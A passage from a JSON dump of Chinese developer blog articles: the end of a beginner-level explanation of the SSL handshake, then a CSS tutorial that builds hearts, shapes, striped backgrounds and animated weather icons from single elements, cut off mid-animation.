class=\"heading\"\u003eSSL协议的握手过程\u003c/h3\u003e\n\u003cp\u003e先用语言来阐述下：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003e第一步\u003c/strong\u003e：爱丽丝给出支持SSL协议版本号，一个客户端\u003cstrong\u003e随机数\u003c/strong\u003e(Client random，请注意这是第一个随机数)，客户端支持的加密方法等信息；\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e第二步：\u003cstrong\u003e鲍勃收到信息后，确认双方使用的加密方法，并返回数字证书，一个服务器生成的\u003c/strong\u003e随机数\u003c/strong\u003e(Server random，注意这是第二个随机数)等信息；\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e第三步：\u003cstrong\u003e爱丽丝确认数字证书的有效性，然后生成一个新的\u003c/strong\u003e随机数\u003c/strong\u003e(Premaster secret)，然后使用数字证书中的公钥，加密这个随机数，发给鲍勃。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e第四步：\u003cstrong\u003e鲍勃使用自己的私钥，获取爱丽丝发来的\u003c/strong\u003e随机数\u003c/strong\u003e(即Premaster secret)；(第三、四步就是非对称加密的过程了)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e第五步：\u003cstrong\u003e爱丽丝和鲍勃通过约定的加密方法(通常是\u003ca target=\"_blank\" href=\"https://zh.wikipedia.org/wiki/%E9%AB%98%E7%BA%A7%E5%8A%A0%E5%AF%86%E6%A0%87%E5%87%86\"\u003eAES算法\u003c/a\u003e)，使用前面三个随机数，生成\u003c/strong\u003e对话密钥\u003c/strong\u003e，用来加密接下来的通信内容；\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e俗话说一图胜前言，我画了一个图来说明这个过程：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"SSL协议握手过程\" src=\"https://user-gold-cdn.xitu.io/2017/12/31/160acb98fb03e480\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003eOK，整个进行数据加密的过程结束。我们再来回忆下内容：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCA机构颁发数字证书给鲍勃；\u003c/li\u003e\n\u003cli\u003e爱丽丝和鲍勃进行SSL握手，爱丽丝通过数字证书确定鲍勃的身份；\u003c/li\u003e\n\u003cli\u003e爱丽丝和鲍勃传递三个随机数，第三个随机数通过非对称加密算法进行传递；\u003c/li\u003e\n\u003cli\u003e爱丽丝和鲍勃通过一个对称加密算法生成一个对话密钥，加密接下来的通信内容。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003e后记\u003c/h2\u003e\n\u003cp\u003e文中阐述不妥之处还望雅正，不吝感激。\u003c/p\u003e\n\u003cp\u003e转载请注明出处。\u003c/p\u003e\n\u003cp\u003e以上。\u003c/p\u003e\n","buildTime":"1514888865.9244","__v":0}
{"_id":{"$oid":"5a4b765a751bf823c002e925"},"id":"5a446d19f265da43052eebcc","author":{"$oid":"5a4b765a751bf823c002e90d"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"你以为 CSS 只是个简单的布局？","meta":{"likeCount":0},"tag":["CSS"],"comment":[],"shortContent":"前几天看了一篇文章 ， 颠覆了我对 CSS 认识，心中无数次蹦出一个念头：'卧槽，卧槽，还能特么这么用，这特么太叼了' ... 本文中，所有的图形都是在单个标签内实现的，大量使用了 CSS3 中的 ::before 、::after 伪元素，transparent 、borde…","content":"\u003ch2 class=\"heading\"\u003eCSS3 奇思妙想\u003c/h2\u003e\n\u003cp\u003e前几天看了一篇文章 ， 颠覆了我对 \u003ccode\u003eCSS\u003c/code\u003e 认识，心中无数次蹦出一个念头：'卧槽，卧槽，还能特么这么用，这特么太叼了' ...\u003c/p\u003e\n\u003cp\u003e于是我迫不及待想跟你们一起分享分享，以后你也可以在别人面前炫（装）耀（逼）了~\u003c/p\u003e\n\u003cp\u003eps：本文原创不是我，我只是搬运工，看到好东西与大家分享而已，作者 github 主页请戳 \u003ca target=\"_blank\" href=\"https://github.com/chokcoco\"\u003e这里\u003c/a\u003e~\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e装逼指南\u003c/h3\u003e\n\u003cp\u003e本文中，所有的图形都是在单个标签内实现的，大量使用了 \u003ccode\u003eCSS3\u003c/code\u003e 中的 \u003ccode\u003e::before\u003c/code\u003e 、\u003ccode\u003e::after\u003c/code\u003e 伪元素，\u003ccode\u003etransparent\u003c/code\u003e 、\u003ccode\u003eborder\u003c/code\u003e，多重线性与径向渐变，多重内外阴影，如果你的效果不尽人意，请尝试在 \u003ccode\u003eChrome\u003c/code\u003e 浏览器下预览。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e装逼技巧\u003c/h3\u003e\n\u003cp\u003e本文所有图形都会有个容器 \u003ccode\u003e\u0026lt;div class=\"css-cell\"\u0026gt;\u0026lt;/div\u0026gt;\u003c/code\u003e包裹，其样式结构如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e.css-cell{\n    position: relative;\n    width: 100%;\n    height: 300px;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e所有图形都是在容器内实现的，其结构如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\u0026lt;!--heart--\u0026gt;\n\u0026lt;div class=\"css-cell\"\u0026gt;\n    \u0026lt;div class=\"heart\"\u0026gt;\u0026lt;/div\u0026gt;\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e天气那一块有部分会多一个容器，其结构如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\u0026lt;div class=\"css-cell \"\u0026gt;\n    \u0026lt;div class=\"breeze-container\"\u0026gt;\n        \u0026lt;div class=\"breeze\"\u0026gt;\u0026lt;/div\u0026gt;\n    \u0026lt;/div\u0026gt;\n\u0026lt;/div\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e为了方便起见，下面图形的具体实现，我只会贴出对应的类相应的样式代码~\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e装逼实战\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e爱心\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"爱心\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609b4a25453943f?w=289\u0026amp;h=261\u0026amp;f=png\u0026amp;s=4408\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用 \u003ccode\u003ediv\u003c/code\u003e 的正方形和伪类的圆型组合而成，具体代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*heart*/\n.heart{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%) rotate(45deg);\n    background: red;\n    width: 100px;\n    height: 100px;\n}\n.heart:before,\n.heart:after\n{\n    content: '';\n    position: absolute;\n    top: 0;\n    left: -50px;\n    width: 100px;\n    height: 100px;\n    border-radius: 50%;\n    background: red;\n}\n.heart:after{\n    top: -50px;\n    left: 0;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e气泡悬浮框\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"气泡悬浮框\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609bc49342281b1?w=403\u0026amp;h=247\u0026amp;f=png\u0026amp;s=4821\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用 \u003ccode\u003eborder\u003c/code\u003e 结合 \u003ccode\u003etransparent\u003c/code\u003e 特性实现，代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*bubbly*/\n.bubbly{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%);\n    background: #00ccbb;\n    border-radius: 8px;\n    width: 200px;\n    padding: 40px 10px;\n    text-align: center;\n    color: white;\n    font-size: 20px;\n}\n.bubbly:after {\n    content: '';\n    position: absolute;\n    bottom: 0;\n    left: 50%;\n    border: 34px solid transparent;\n    border-top-color: #00ccbb;\n    border-bottom: 0;\n    border-left: 0;\n    margin: 0 0 -34px -17px;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e切角\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"切角\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609bcfc3fb6ab17?w=344\u0026amp;h=202\u0026amp;f=png\u0026amp;s=2628\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用使用线性渐变实现的，代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*notching*/\n.notching{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%);\n    width: 200px;\n    padding: 60px 20px;\n}\n.notching{\n    background:\n            linear-gradient(135deg, transparent 15px, deeppink 0)\n            top left,\n            linear-gradient(-135deg, transparent 15px, deeppink 0)\n            top right,\n            linear-gradient(-45deg, transparent 15px, deeppink 0)\n            bottom right,\n            linear-gradient(45deg, transparent 15px, deeppink 0)\n            bottom left;\n    background-size: 50% 50%;\n    background-repeat: no-repeat;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e弧形切角\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"弧形切角\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609bd960a8abe5c?w=399\u0026amp;h=237\u0026amp;f=png\u0026amp;s=3843\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e使用径向渐变实现，具体实现如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*arc*/\n.arc{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%);\n    width: 80px;\n    padding: 80px;\n}\n.arc {\n    background:\n            radial-gradient(circle at top left,\n            transparent 15px, yellowgreen 0) top left,\n            radial-gradient(circle at top right,\n            transparent 15px, yellowgreen 0) top right,\n            radial-gradient(circle at bottom right,\n            transparent 15px, yellowgreen 0) bottom right,\n            radial-gradient(circle at bottom left,\n            transparent 15px, yellowgreen 0) bottom left;\n    background-size: 50% 50%;\n    background-repeat: no-repeat;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e梯形\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"梯形\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609bedfbc4f9e4e?w=408\u0026amp;h=213\u0026amp;f=png\u0026amp;s=3823\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用伪类加旋转透视实现，具体实现如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*trapezoid*/\n.trapezoid{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%);\n    width: 160px;\n    padding: 60px;\n}\n.trapezoid:before{\n    content:\"\";\n    position: absolute;\n    top: 0; \n    right: 0;\n    bottom: 0; \n    left: 0;\n    transform:perspective(40px) scaleY(1.3) rotateX(5deg);\n    transform-origin: bottom;\n    background:dodgerblue;\n    z-index:-1;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e饼图\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"饼图\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609bf61246a04d0?w=339\u0026amp;h=249\u0026amp;f=png\u0026amp;s=7235\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用伪类、线性渐变、旋转实现，具体代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*pie*/\n.pie{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%);\n    width: 200px;\n    height:200px;\n    border-radius:50%;\n    text-align: center;\n    background-color:yellowgreen;\n    overflow:hidden;\n    background-image: linear-gradient(to right, transparent 50%, #655 0);\n    cursor:pointer;\n}\n.pie:before{\n    content:\"\";\n    position:absolute;\n    top:0;\n    left:50%;\n    width:50%;\n    height:100%;\n    background-color: inherit;\n    transform-origin: left;\n    z-index:-1;\n    transform:rotate(.1turn);\n}\n.pie:hover:before{\n    transition:all 1s;\n    transform:rotate(.45turn);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e平行四边形\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"平行四边形\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c0352dacd9b9?w=380\u0026amp;h=220\u0026amp;f=png\u0026amp;s=3468\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用伪类、拉伸实现，实现过程如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*parallelogram*/\n.parallelogram{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%);\n    width: 200px;\n    height:120px;\n\n}\n.parallelogram:before{\n    content: '';\n    position: absolute;\n    top: 0;\n    right: 0;\n    bottom: 0;\n    left: 0;\n    background-color:#00aabb;\n    z-index:-1;\n    transform: skew(.08turn);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e折角\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"折角\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c0974bbd2eff?w=360\u0026amp;h=272\u0026amp;f=png\u0026amp;s=5370\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用切角、伪类、渐变、旋转实现，代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*corner*/\n.corner{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%);\n    width: 120px;\n    height:120px;\n    padding:40px;\n    background:linear-gradient(-150deg,transparent 1.5em, yellowgreen  0);\n    border-radius:8px;\n}\n.corner:before{\n    content: '';\n    position: absolute;\n    top: 0; right: 0;\n    background: linear-gradient(to left bottom,transparent 50%, rgba(0,0,0,.2) 0, rgba(0,0,0,.4)) 100% 0 no-repeat;\n    width: 1.73em;\n    height: 3em;\n    transform: translateY(-1.3em) rotate(-30deg);\n    transform-origin: bottom right;\n    border-bottom-left-radius: inherit;\n    box-shadow: -.2em .2em .3em -.1em rgba(0,0,0,.15);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e纯 CSS 方案实现背景变暗效果（hover按钮触发）\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"hover之前\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c0f767ce7bc6?w=365\u0026amp;h=276\u0026amp;f=png\u0026amp;s=3843\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e鼠标移入\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"hover之后\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c1260cb55808?w=373\u0026amp;h=282\u0026amp;f=png\u0026amp;s=3717\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用 \u003ccode\u003ebox-shadow\u003c/code\u003e 实现，具体代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*spectiveBlur*/\n.spectiveBlur{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width: 220px;\n    height:160px;\n    transform: translate(-50%, -50%);\n    border-radius:10px;\n    overflow:hidden;\n    background:#E91E63;\n    cursor:pointer;\n    transition: transform .2s;\n}\n.spectiveBlur:hover{\n    box-shadow:0 0 0 1920px rgba(0,0,0,.7);\n    transform: translate(-50%, -50%) scale(1.2);\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e条纹背景图\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e主要是利用渐变实现，具体实现如下：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"条纹背景图\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c1c08d51999a?w=307\u0026amp;h=267\u0026amp;f=png\u0026amp;s=5324\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*stripe*/\n.stripe{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%);\n    width: 200px;\n    height:200px;\n    background:deeppink;\n    border-radius:.5em;\n    background:repeating-linear-gradient(45deg,#CC9999, #CC9999 15px, #CCCCCC 0, #CCCCCC 30px)\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"条纹背景图\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c2bc6f0c78c7?w=316\u0026amp;h=260\u0026amp;f=png\u0026amp;s=5738\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*wave-stripe*/\n.wave-stripe{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%);\n    width: 200px;\n    height:200px;\n    border-radius:.5em;\n    background:\n            linear-gradient(135deg, deeppink 25%, transparent 25%) -50px 0,\n            linear-gradient(225deg, deeppink 25%, transparent 25%) -50px 0,\n            linear-gradient(315deg, deeppink 25%, transparent 25%),\n            linear-gradient(45deg, deeppink 25%, transparent 25%);\n    background-size: 40px 40px;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"条纹背景图\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c3045511cb71?w=322\u0026amp;h=270\u0026amp;f=png\u0026amp;s=5492\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*arrow-stripe*/\n.arrow-stripe{\n    position: absolute;\n    top:50%;\n    left: 50%;\n    transform:translate(-50%,-50%);\n    width: 200px;\n    height:200px;\n    border-radius:.5em;\n    background:\n            linear-gradient(45deg, #92baac 45px, transparent 45px)64px 64px,\n            linear-gradient(45deg, #92baac 45px, transparent 45px,transparent 91px, #e1ebbd 91px, #e1ebbd 135px, transparent 135px),\n            linear-gradient(-45deg, #92baac 23px, transparent 23px, transparent 68px,#92baac 68px,#92baac 113px,transparent 113px,transparent 158px,#92baac 158px);\n    background-color:#e1ebbd;\n    background-size: 128px 128px;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e混合模式背景图\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"混合模式背景图\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609c32894bab7b7?w=409\u0026amp;h=266\u0026amp;f=png\u0026amp;s=103981\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e.colorful-stripe {\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    transform: translate(-50%, -50%);\n    width: 300px;\n    height: 200px;\n    text-align: center;\n    color: #fff;\n    font-size: 200%;\n    border-radius: .5em;\n    background:\n            linear-gradient(limegreen, transparent), linear-gradient(90deg, skyblue, transparent), linear-gradient(-90deg, coral, transparent);\n    background-blend-mode: screen;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e太阳\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"sun\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cb0a29b83907?w=294\u0026amp;h=289\u0026amp;f=gif\u0026amp;s=181664\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用线性渐变、阴影、旋转实现，具体代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*sun*/\n.sun{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width:200px;\n    height:260px;\n    transform: translate(-50%, -50%);\n    background:#0BF;\n    border-radius:5px;\n}\n.sun:before{\n    content:\"\";\n    position: absolute;\n    width: 80px;\n    height: 80px;\n    left: 50%;\n    top: 50%;\n    transform: translate(-50%, -50%);\n    border-radius:50%;\n    background:rgba(255, 238, 68, 1);\n    box-shadow: 0 0 0 15px rgba(255,255,0,0.2),0 0 15px #fff;\n    z-index:-10;\n}\n.sun:after{\n    content:\"\";\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    height: 160px;\n    width: 160px;\n    transform: translate(-50%, -50%) rotate(30deg);\n    z-index:-100;\n    background-image:\n            -webkit-linear-gradient(top,rgba(255,255,255,0) 0%, rgba(255,255,255,0.8) 50%, rgba(255,255,255,0) 100%),\n            -webkit-linear-gradient(left,rgba(255,255,255,0) 0%, rgba(255,255,255,0.8) 50%, rgba(255,255,255,0) 100%);\n    background-size: 20px 100%, 100% 20px;\n    background-repeat: no-repeat;\n    background-position: center center, center center;\n    animation:sunRotate 10s linear infinite;\n}\n@keyframes sunRotate{\n    0%{\n        transform: translate(-50%, -50%) rotate(30deg);\n    }\n    100%{\n        transform: translate(-50%, -50%) rotate(390deg);\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e多云\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"cloud\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cb292be61801?w=294\u0026amp;h=289\u0026amp;f=gif\u0026amp;s=308777\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用线性渐变、阴影、缩放实现，具体实现如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*cloudy*/\n.cloudy{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width:200px;\n    height:260px;\n    transform: translate(-50%, -50%);\n    background:#2EB5E5;\n    border-radius:5px;\n}\n.cloudy:before {\n    content: \"\";\n    text-indent:23px;\n    font-size:22px;\n    line-height:40px;\n    color:#333;\n    position: absolute;\n    height: 50px;width: 50px;\n    background: #FFFFFF;\n    left:30%;\n    top:45%;\n    transform: translate(-50%, -50%);\n    border-radius: 50%;\n    box-shadow:\n            #FFFFFF 65px -15px 0 -5px,\n            #FFFFFF 25px -25px,\n            #FFFFFF 30px 10px,\n            #FFFFFF 60px 15px 0 -10px,\n            #FFFFFF 85px 5px 0 -5px,\n            #C8C8C8 35px -35px,\n            #C8C8C8 66px -27px 0 -5px,\n            #C8C8C8 91px -10px 0 -8px;\n    animation: cloudy 5s ease-in-out infinite;\n}\n.cloudy:after{\n    content:\"\";\n    position: absolute;\n    top: 80%;\n    left: 50%;\n    height: 15px;\n    width: 120px;\n    background:rgba(0,0,0,.5);\n    border-radius: 50%;\n    transform: translate(-50%, -50%);\n    animation: cloudy_shadow 5s ease-in-out infinite;\n}\n@keyframes cloudy {\n    50%{\n        transform: translate(-50%, -70%);\n    }\n    100%{\n        transform: translate(-50%, -50%);\n    }\n}\n@keyframes cloudy_shadow {\n    50%{\n        transform: translate(-50%, -50%) scale(0.8);\n        background:rgba(0,0,0,.2);\n    }\n    100%{\n        transform: translate(-50%, -50%) scale(1);\n        background:rgba(0,0,0,.5);\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"cloud2\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cb387b64eb76?w=294\u0026amp;h=289\u0026amp;f=gif\u0026amp;s=363884\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*cloudy2*/\n.cloudy2{\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    width:200px;\n    height:260px;\n    transform: translate(-50%, -50%);\n    background:#2EB5E5;\n    border-radius:5px;\n}\n.cloudy2:before {\n    content: \"\";\n    text-indent:23px;\n    font-size:22px;\n    line-height:40px;\n    color:#333;\n    position: absolute;\n    height: 50px;width: 50px;\n    background: #FFFFFF;\n    left:30%;\n    top:55%;\n    transform: translate(-50%, -50%);\n    border-radius: 50%;\n    z-index:100;\n    box-shadow:\n            #FFFFFF 65px -15px 0 -5px,\n            #FFFFFF 25px -25px,\n            #FFFFFF 30px 10px,\n            #FFFFFF 60px 15px 0 -10px,\n            #FFFFFF 85px 5px 0 -5px;\n    animation: cloudy2 5s ease-in-out infinite;\n}\n.cloudy2:after{\n    content:\"\";\n    position: absolute;\n    top: 45%;left: 63%;\n    height: 60px;\n    width: 60px;\n    z-index:10;\n    background:linear-gradient(180deg,#FE9F38 0%, #F46635 100%);\n    border-radius: 50%;\n    transform: translate(-50%, -50%);\n    box-shadow: 0 0 10px 4px #FFA563;\n    animation: cloudy2 10s ease-in-out infinite;\n}\n@keyframes cloudy2 {\n    50%{\n        transform: translate(-50%, -70%);\n    }\n    100%{\n        transform: translate(-50%, -50%);\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e雨\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"rain\" src=\"https://user-gold-cdn.xitu.io/2017/12/28/1609cb4becbf5596?w=294\u0026amp;h=289\u0026amp;f=gif\u0026amp;s=147929\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e利用线性渐变、阴影、缩放实现，具体代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e/*rainy*/\n.rainy {\n    position: absolute;\n    width: 3px;\n    height: 6px;\n    top: 30%;\n    left: 50%;\n    background: #CCCCCC;\n    border-radius: 50%;\n    animation: rainy_rain .7s infinite linear;\n}\n.rainy:before {\n    content: \"\";\n    color: #333;\n    position: absolute;\n    height: 50px;\n    width: 50px;\n    top: 30px;\n    left: -40px;\n    background: #CCC;\n    transform: translate(-50%, -50%);\n    border-radius: 50%;\n    box-shadow: #CCC 65px -15px 0 -5px, #CCC 25px -25px, #CCC 30px 10px, #CCC 60px 15px 0 -10px, #CCC 85px 5px 0 -5px;\n    animation: cloudy 5s ease-in-out infinite;\n}\n.rainy:after {\n    content: \"\";\n    position: absolute;\n    top: 120px;\n    left: 50%;\n    height: 15px;\n    width: 120px;\n    background: rgba(0, 0, 0, .5);\n    border-radius: 50%;\n    transform: translate(-50%, -50%);\n    animation: cloudy_shadow 5s ease-in-out infinite;\n}\n@keyframes cloudy {\n    50% {\n        transform: translate(-50%, -70%);\n    }\n    100% {\n        transform: translate(-50%, -50%);\n    }\n}\n@keyframes cloudy_shadow {\n    50% {\n        transform: translate(-50%, -50%) scale(0.8);\n        background: rgba(0, 0, 0, .2);\n    }\n    100% {\n        transform: translate(-50%, -50%) scale(1);\n        background: rgba(0, 0, 0, .5);\n    }\n}\n@keyframes rainy_rain {\n    0% {\n        box-shadow: rgba(0, 0, 0, 0) -10px 30px, rgba(0, 0, 0, 0) 40px 40px, rgba(0, 0, 0, .3) -50px 75px, rgba(0, 0, 0, .3) 55px 50px, rgba(0, 0, 0, .3) -18px 100px, rgba(0, 0, 0, .3) 12px 95px, rgba(0, 0, 0, .3) -31px 45px, rgba(0, 0, 0, .3) 30px 35px;\n    }\n    25% {\n        box-shadow: rgba(0, 0, 0, .3) -10px 45px, rgba(0, 0, 0, .3) 40px 60px, rgba(0, 0, 0, .3) -50px 90px, rgba(0, 0, 0, .3) 55px 65px, rgba(0, 0, 0, 0) -18px 120px, rgba(0, 0, 0, 0) 12px 120px, rgba(0, 0, 0, .3) -31px 70px, rgba(0, 0, 0, .3) 30px 60px;\n    }\n    26% {\n        box-shadow: rgba(0, 0, 0, .3) -10px 45px, rgba(0, 0, 0, .3) 40px 60px, rgba(0, 0, 0, .3) -50px 90px, rgba(0, 0, 0, .3) 55px 65px, 